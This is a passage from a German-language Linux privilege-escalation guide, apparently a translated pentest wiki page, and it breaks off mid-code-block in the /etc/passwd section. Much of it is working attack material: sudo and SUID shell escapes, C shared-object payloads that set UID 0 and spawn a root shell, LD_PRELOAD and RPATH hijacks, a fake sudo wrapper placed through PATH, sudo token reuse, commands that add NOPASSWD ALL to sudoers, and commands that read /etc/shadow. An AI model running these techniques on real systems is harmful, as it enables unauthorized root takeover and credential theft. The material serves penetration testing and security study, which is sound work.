Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird bereitgestellt, die die Berechtigungen für den Root-Benutzer beschreibt, um Nachrichten von `fi.w1.wpa_supplicant1` zu besitzen, zu senden und zu empfangen.

Richtlinien ohne einen angegebenen Benutzer oder eine Gruppe gelten universell, während "Standard"-Kontextrichtlinien für alle gelten, die nicht von anderen spezifischen Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lernen Sie hier, wie man eine D-Bus-Kommunikation enumeriert und ausnutzt:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerieren und die Position der Maschine herauszufinden.

### Generische Enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfen Sie immer die Netzwerkdienste, die auf der Maschine laufen, mit der Sie zuvor nicht interagieren konnten, bevor Sie darauf zugreifen:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Überprüfen Sie, ob Sie den Datenverkehr sniffen können. Wenn ja, könnten Sie in der Lage sein, einige Anmeldeinformationen zu erfassen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Aufzählung

Überprüfen Sie **wer** Sie sind, welche **Befugnisse** Sie haben, welche **Benutzer** im System sind, welche sich **anmelden** können und welche **Root-Rechte** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Fehler betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Weitere Informationen: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [hier](https://twitter.com/paragonsec/status/1071152249529884674).\
**Nutze es aus** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Überprüfe, ob du **Mitglied einer Gruppe** bist, die dir Root-Rechte gewähren könnte:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (wenn möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwort-Richtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn Sie **ein Passwort** der Umgebung **kennen, versuchen Sie sich als jeder Benutzer** mit dem Passwort anzumelden.

### Su Brute

Wenn es Ihnen nichts ausmacht, viel Lärm zu machen und die `su`- und `timeout`-Binaries auf dem Computer vorhanden sind, können Sie versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem `-a`-Parameter versucht ebenfalls, Benutzer zu brute-forcen.

## Schreibbare PATH-Missbräuche

### $PATH

Wenn Sie feststellen, dass Sie **in einen Ordner des $PATH** schreiben können, könnten Sie in der Lage sein, Privilegien zu eskalieren, indem Sie **eine Hintertür im beschreibbaren Ordner** mit dem Namen eines Befehls erstellen, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der vor** Ihrem beschreibbaren Ordner im $PATH liegt.

### SUDO und SUID

Es könnte Ihnen erlaubt sein, einige Befehle mit sudo auszuführen oder sie könnten das SUID-Bit haben. Überprüfen Sie dies mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle ermöglichen es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration könnte es einem Benutzer ermöglichen, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen, es ist jetzt trivial, eine Shell zu erhalten, indem man einen SSH-Schlüssel in das Root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht es dem Benutzer, **eine Umgebungsvariable** beim Ausführen von etwas festzulegen:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH-Hijacking**, um eine beliebige Python-Bibliothek zu laden, während das Skript als Root ausgeführt wird:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo-Ausführungsumgehungspfade

**Springen** Sie, um andere Dateien zu lesen oder verwenden Sie **Symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **Wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binärdatei ohne Befehls-Pfad

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfades** gewährt wird: _hacker10 ALL= (root) less_, kannst du dies ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn eine **suid**-Binärdatei **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (überprüfen Sie immer mit** _**strings**_ **den Inhalt einer seltsamen SUID-Binärdatei)**.

[Payload-Beispiele zur Ausführung.](payloads-to-execute.md)

### SUID-Binärdatei mit Befehls-Pfad

Wenn die **suid**-Binärdatei **einen anderen Befehl unter Angabe des Pfades ausführt**, können Sie versuchen, eine **Funktion** zu exportieren, die denselben Namen wie der Befehl hat, den die SUID-Datei aufruft.

Zum Beispiel, wenn eine SUID-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, müssen Sie versuchen, die Funktion zu erstellen und sie zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann, wenn Sie die SUID-Binärdatei aufrufen, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD**-Umgebungsvariable wird verwendet, um eine oder mehrere gemeinsam genutzte Bibliotheken (.so-Dateien) anzugeben, die vom Loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Prozess wird als Vorladen einer Bibliothek bezeichnet.

Um jedoch die Systemsicherheit aufrechtzuerhalten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Ausführungen, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** für Ausführungen, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Für Ausführungen mit suid/sgid werden nur Bibliotheken in Standardpfaden, die ebenfalls suid/sgid sind, vorab geladen.

Eine Privilegieneskalation kann auftreten, wenn Sie die Möglichkeit haben, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Aussage **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration ermöglicht es, dass die **LD_PRELOAD**-Umgebungsvariable bestehen bleibt und auch erkannt wird, wenn Befehle mit `sudo` ausgeführt werden, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **erhöhen Sie die Berechtigungen** durch Ausführung
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID-Binärdatei – .so-Injektion

Wenn Sie auf eine Binärdatei mit **SUID**-Berechtigungen stoßen, die ungewöhnlich erscheint, ist es eine gute Praxis zu überprüfen, ob sie **.so**-Dateien ordnungsgemäß lädt. Dies kann überprüft werden, indem Sie den folgenden Befehl ausführen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein potenzielles Exploitationsrisiko hin.

Um dies auszunutzen, würde man fortfahren, indem man eine C-Datei erstellt, sagen wir _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt darauf ab, die Berechtigungen zu erhöhen, indem er die Dateiberechtigungen manipuliert und eine Shell mit erhöhten Berechtigungen ausführt, sobald er kompiliert und ausgeführt wird.

Kompilieren Sie die obige C-Datei in eine Shared Object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei die Ausnutzung auslösen, was zu einer potenziellen Kompromittierung des Systems führen kann.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Jetzt, da wir eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Ordner lädt, in den wir schreiben können, lassen Sie uns die Bibliothek in diesem Ordner mit dem erforderlichen Namen erstellen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die von Ihnen generierte Bibliothek eine Funktion namens `a_function_name` haben muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binärdateien, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen Sie **nur Argumente** in einen Befehl injizieren können.

Das Projekt sammelt legitime Funktionen von Unix-Binärdateien, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu erzeugen und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Wenn Sie auf `sudo -l` zugreifen können, können Sie das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu überprüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Wiederverwendung von Sudo-Token

In Fällen, in denen Sie **sudo-Zugriff** haben, aber nicht das Passwort, können Sie Privilegien eskalieren, indem Sie **auf die Ausführung eines sudo-Befehls warten und dann das Sitzungstoken übernehmen**.

Anforderungen zur Eskalation von Privilegien:

- Sie haben bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um etwas in den **letzten 15 Minuten** auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, das es uns ermöglicht, `sudo` zu verwenden, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (Sie sollten in der Lage sein, es hochzuladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Anforderungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt die Binärdatei `activate_sudo_token` in _/tmp_. Sie können es verwenden, um **das sudo-Token in Ihrer Sitzung zu aktivieren** (Sie erhalten nicht automatisch eine Root-Shell, führen Sie `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) wird eine sh-Shell in _/tmp_ **erstellen, die von root mit setuid besessen wird**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) wird eine **sudoers-Datei erstellen**, die **sudo-Token ewig macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibberechtigungen** im Ordner oder auf einer der darin erstellten Dateien haben, können Sie die Binärdatei [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und PID zu erstellen**.\
Wenn Sie beispielsweise die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und Sie eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Rechte erhalten**, ohne das Passwort wissen zu müssen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur von Benutzer root und Gruppe root gelesen werden**.\
**Wenn** Sie diese Datei **lesen** können, könnten Sie in der Lage sein, **einige interessante Informationen zu erhalten**, und wenn Sie **irgendeine Datei schreiben** können, werden Sie in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie schreiben können, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo`-Binärdatei, wie `doas` für OpenBSD. Vergessen Sie nicht, die Konfiguration unter `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn Sie wissen, dass ein **Benutzer normalerweise eine Maschine verbindet und `sudo`** verwendet, um Privilegien zu eskalieren, und Sie haben eine Shell im Kontext dieses Benutzers erhalten, können Sie **eine neue sudo ausführbare Datei erstellen**, die Ihren Code als root ausführt und dann den Befehl des Benutzers. Dann **ändern Sie den $PATH** des Benutzerkontexts (zum Beispiel, indem Sie den neuen Pfad in .bash_profile hinzufügen), sodass, wenn der Benutzer sudo ausführt, Ihre sudo ausführbare Datei ausgeführt wird.

Beachten Sie, dass Sie, wenn der Benutzer eine andere Shell (nicht bash) verwendet, andere Dateien ändern müssen, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) ändert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Sie können ein weiteres Beispiel in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) finden.

Oder etwas wie ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt **an, woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen **Bibliotheken** **gesucht** werden. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken im Verzeichnis `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibberechtigungen** für einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner innerhalb der Konfigurationsdatei in `/etc/ld.so.conf.d/*.conf`, könnte er in der Lage sein, Privilegien zu eskalieren.\
Schau dir an, **wie man diese Fehlkonfiguration ausnutzen kann** auf der folgenden Seite:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der lib in `/var/tmp/flag15/` wird sie von dem Programm an diesem Ort verwendet, wie im `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Dann erstellen Sie eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux-Fähigkeiten bieten eine **Teilmenge der verfügbaren Root-Rechte für einen Prozess**. Dies zerlegt effektiv die Root-**Rechte in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig Prozessen gewährt werden. Auf diese Weise wird die vollständige Menge an Rechten reduziert, was die Risiken einer Ausnutzung verringert.\
Lesen Sie die folgende Seite, um **mehr über Fähigkeiten und deren Missbrauch zu erfahren**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis impliziert das **Bit für "ausführen"**, dass der betroffene Benutzer in den Ordner "**cd**" wechseln kann.\
Das **"lesen"**-Bit impliziert, dass der Benutzer die **Dateien** **auflisten** kann, und das **"schreiben"**-Bit impliziert, dass der Benutzer **löschen** und **neue Dateien** **erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Schicht der diskretionären Berechtigungen dar, die in der Lage sind, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die nicht die Eigentümer oder Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden Sie [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Geben** Sie dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Holen** Sie Dateien mit spezifischen ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene Shell-Sitzungen

In **alten Versionen** können Sie einige **Shell**-Sitzungen eines anderen Benutzers (**root**) **übernehmen**.\
In **neueren Versionen** können Sie nur zu Screen-Sitzungen Ihres **eigenen Benutzers** **verbinden**. Sie könnten jedoch **interessante Informationen innerhalb der Sitzung** finden.

### Screen-Sitzungen übernehmen

**Liste der Screen-Sitzungen**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine Sitzung anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux-Sitzungen hijacken

Dies war ein Problem mit **alten tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1) Sitzung als nicht privilegierter Benutzer nicht hijacken.

**Liste der tmux-Sitzungen**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Sitzung anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Überprüfen Sie die **Valentine-Box von HTB** für ein Beispiel.

## SSH

### Debian OpenSSL Vorhersehbarer PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu usw.) zwischen September 2006 und dem 13. Mai 2008 generiert wurden, können von diesem Fehler betroffen sein.\
Dieser Fehler tritt auf, wenn ein neuer SSH-Schlüssel in diesen Betriebssystemen erstellt wird, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn Sie den SSH-Öffentlichen Schlüssel haben, können Sie nach dem entsprechenden privaten Schlüssel suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Der Standardwert ist `no`.
- **PubkeyAuthentication:** Gibt an, ob die Authentifizierung mit öffentlichem Schlüssel erlaubt ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn die Passwortauthentifizierung erlaubt ist, gibt an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenfolgen erlaubt. Der Standardwert ist `no`.

### PermitRootLogin

Gibt an, ob root sich über SSH anmelden kann, der Standardwert ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel anmelden und wenn die Befehlsoptionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn Sie versuchen, sich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, ssh den öffentlichen Schlüssel Ihres Schlüssels mit den in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` befindlichen vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH-Agent-Weiterleitung ermöglicht es Ihnen, **Ihre lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf Ihrem Server zu belassen. So können Sie **über ssh zu einem Host springen** und von dort **zu einem anderen** Host **springen, indem Sie** den **Schlüssel** verwenden, der sich auf Ihrem **ursprünglichen Host** befindet.

Sie müssen diese Option in `$HOME/.ssh.config` wie folgt festlegen:
```
Host example.com
ForwardAgent yes
```
Beachten Sie, dass wenn `Host` `*` ist, der Benutzer jedes Mal, wenn er zu einer anderen Maschine wechselt, auf die Schlüssel zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann das Weiterleiten des ssh-agent mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist erlauben).

Wenn Sie feststellen, dass der Forward Agent in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **Sie möglicherweise in der Lage sind, dies auszunutzen, um Privilegien zu eskalieren**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher können Sie, wenn Sie **eine von ihnen schreiben oder ändern können, Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein seltsames Profilskript gefunden wird, sollten Sie es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann eine Sicherungskopie vorhanden sein. Daher wird empfohlen, **alle zu finden** und **zu überprüfen, ob Sie sie lesen können**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen können Sie **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Zuerst generieren Sie ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
